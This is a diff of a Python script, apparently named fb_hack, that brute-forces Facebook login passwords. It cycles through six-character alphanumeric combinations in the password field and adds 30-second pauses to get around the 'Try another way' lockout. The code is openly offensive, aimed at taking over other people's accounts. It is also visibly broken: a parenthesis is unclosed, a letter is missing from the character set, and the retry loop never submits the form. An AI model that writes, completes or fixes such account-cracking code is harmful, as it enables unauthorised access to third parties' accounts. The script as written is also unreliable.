@@ -77,12 +77,20 @@ def fb_hack(email, codex, search):
   browser.submit()
   counter = 0
   response1 = browser.response()
-  soup.find()
+  soup = BeautifulSoup(response1, 'html.parser')
+  z = soup.find(string("Try another way")
   for combination in itertools.product([0,1,2,3,4,5,6,7,8,9,"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","","X","Y","Z"], repeat=6):
-    x = (''.join(map(str, combination)))
-    browser.form['pass'] = x
-    test = (x, " failed")
-    yo = h.join(test)
+    try:
+      while z == "Try another way":
+        x = (''.join(map(str, combination)))
+        browser.form['pass'] = x
+        test = (x, " failed")
+        sleepy(30)
+        yo = h.join(test)
+    except:
+      response1 = browser.response()
+      soup = BeautifulSoup(response1, 'html.parser')
+      
     
     counter += 1
     print(int(counter), end='\r')
